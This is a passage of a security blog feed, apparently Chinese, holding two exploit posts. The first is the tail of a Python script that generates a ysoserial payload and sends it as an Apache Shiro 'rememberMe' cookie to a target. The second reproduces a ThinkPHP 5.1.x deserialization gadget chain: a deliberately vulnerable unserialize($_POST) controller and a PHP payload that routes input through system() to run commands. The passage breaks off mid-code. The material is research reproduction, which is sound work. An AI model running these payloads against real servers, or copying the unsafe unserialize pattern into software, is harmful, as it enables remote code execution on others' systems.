ar:&#123;1&#125;/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:&#123;1&#125;/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:&#123;1&#125;/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:&#123;1&#125;/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:&#123;1&#125;/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:&#123;1&#125;/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:&#123;1&#125;/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:&#123;1&#125;/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:&#123;1&#125;/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:&#123;1&#125;/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:&#123;1&#125;/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:&#123;1&#125;/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:&#123;1&#125;/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:&#123;1&#125;/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:&#123;1&#125;/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:&#123;1&#125;/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:&#123;1&#125;/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:&#123;1&#125;/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:&#123;1&#125;/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:&#123;1&#125;/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:&#123;1&#125;/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:&#123;1&#125;/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:&#123;1&#125;/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:&#123;1&#125;/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:&#123;1&#125;/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:&#123;1&#125;/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:&#123;1&#125;/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:&#123;1&#125;/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:&#123;1&#125;/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:&#123;1&#125;/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:&#123;1&#125;/antlr/antlr/2.7.7/antlr-2.7.7.jar:&#123;1&#125;/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:&#123;1&#125;/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:&#123;1&#125;/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:&#123;1&#125;/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:&#123;1&#125;/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:&#123;1&#125;/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:&#123;1&#125;/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:&#123;1&#125;/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:&#123;1&#125;/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:&#123;1&#125;/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:&#123;1&#125;/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:&#123;1&#125;/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:&#123;1&#125;/xalan/xalan/2.7.2/xalan-2.7.2.jar:&#123;1&#125;/xalan/serializer/2.7.2/serializer-2.7.2.jar:&#123;1&#125;/rome/rome/1.0/rome-1.0.jar:&#123;1&#125;/jdom/jdom/1.0/jdom-1.0.jar:&#123;1&#125;/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:&#123;1&#125;/rhino/js/1.7R2/js-1.7R2.jar:&#123;1&#125;/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:&#123;1&#125;/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:&#123;1&#125;/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:&#123;1&#125;/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:&#123;1&#125;/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:&#123;1&#125;/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:&#123;1&#125;/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:&#123;1&#125;/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:&#123;1&#125;/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:&#123;1&#125;/javax/inject/javax.inject/1/javax.inject-1.jar:&#123;1&#125;/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:&#123;1&#125;/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:&#123;1&#125;/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:&#123;1&#125;/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:&#123;1&#125;/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:&#123;1&#125;/org/w3c/css/sac/1.3/sac-1.3.jar:&#123;1&#125;/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:&#123;1&#125;/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:&#123;1&#125;/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:&#123;1&#125;/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar&quot;</span>.<span class="built_in">format</span>(yso_path, mvn_home, jar_path)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(version)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-cp&#x27;</span>, cmd2, <span class="string">&quot;ysoserial.GeneratePayload&quot;</span>, gadget, command],stdout=subprocess.PIPE)</span><br><span class="line">    payload = popen.stdout.read()</span><br><span class="line">    base64_ciphertext = encode(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        JAR_FILE = <span class="string">&#x27;/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span></span><br><span class="line">        <span class="comment">#r = requests.get(target, cookies=&#123;&#x27;rememberMe&#x27;: base64_ciphertext.decode()&#125;, timeout=10, proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:8080&#x27;&#125;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/">https://paper.seebug.org/shiro-rememberme-1-2-4/</a><br>
<a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html">https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html</a><br>
<a href="https://blog.zsxsoft.com/post/35">https://blog.zsxsoft.com/post/35</a><br>
<a href="https://www.cnblogs.com/Ahanu/p/5051090.html">https://www.cnblogs.com/Ahanu/p/5051090.html</a><br>
<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a><br>
<a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp 反序列化系列gadget 复现</title>
    <url>/2019/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<!-- thinkphp 反序列化系列gadget 复现 草稿 -->
<!-- more -->
<h2 id="环境准备">环境准备</h2>
<p>安装composer</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line"><span class="built_in">mv</span> composer.phar /usr/local/bin/composer</span><br><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br></pre></td></tr></table></figure>
<p>安装对应版本的tp后，修改index controller的index方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Over&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="ThinkPHP5-1-X">ThinkPHP5.1.X</h2>
<p>安装tp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think tp5137</span><br><span class="line">cd tp5137</span><br><span class="line">vim composer.json # 把&quot;topthink/framework&quot;: &quot;5.1.*&quot;改成&quot;topthink/framework&quot;: &quot;5.1.37&quot;</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure>
<p>think\process\pipes;<br>
<img src="./1571057688760.png" alt="Alt text"></p>
<p>think\model\concern\Conversion<br>
<img src="./1571057946874.png" alt="Alt text"></p>
<p>要进入红框逻辑<br>
<img src="./1571108743808.png" alt="Alt text"><br>
<img src="./1571108805023.png" alt="Alt text"></p>
<p><img src="./1571058276229.png" alt="Alt text"><br>
<img src="./1571108898933.png" alt="Alt text"></p>
<p>基本上扩展到调用任意类的任意方法<br>
<img src="./1571058420105.png" alt="Alt text"></p>
<p><img src="./1571132940856.png" alt="Alt text"></p>
<p>filter<br>
<img src="./1571058910782.png" alt="Alt text"></p>
<p><img src="./1571059077195.png" alt="Alt text"><br>
所以如果实在要用input，就需要迂回即查找有哪些方法内部使用了input，可以找到param。<br>
<img src="./1571069043977.png" alt="Alt text"><br>
不过	$name参数这里是刚才合并数组后第一个参数$this传回到input第二个参数后，会强制类型转换成string。<br>
<img src="./1571069278036.png" alt="Alt text"><br>
所以要强行用input就要继续找其它调用input的方法，或者调用param的方法。<br>
<img src="./1571069583452.png" alt="Alt text"><br>
这样input的第一个参数和第二个参数都可控了。</p>
<p>最后的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Windows</span> &#123;</span><br><span class="line">            <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$fileHandles</span> = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;fileHandles <span class="keyword">as</span> <span class="variable">$handle</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fileHandles = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFile</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;files[] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span> &#123;</span><br><span class="line">        <span class="title class_">trait</span> <span class="title class_">Conversion</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">append</span> = [&#x27;<span class="title class_">key</span>&#x27; =&gt; <span class="title class_">array</span>()];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$item</span>       = [];</span><br><span class="line">                <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">RelationShip</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setRelation</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$relation</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$key</span>] = <span class="variable">$relation</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$filter</span>;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                    <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">InvalidArgumentException</span>(<span class="string">&#x27;property not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setData</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Request</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">mergeParam</span> = <span class="title class_">True</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$hook</span> = [<span class="string">&#x27;visible&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$param</span> = [<span class="string">&#x27;payload&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>)]; <span class="comment">//input的第一个参数</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$config</span> = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;payload&#x27;</span>]; <span class="comment">//var_ajax所对应值是input的第二个参数</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$filter</span> = [<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">                <span class="comment">#var_dump($this-&gt;hook[$method]);</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">                <span 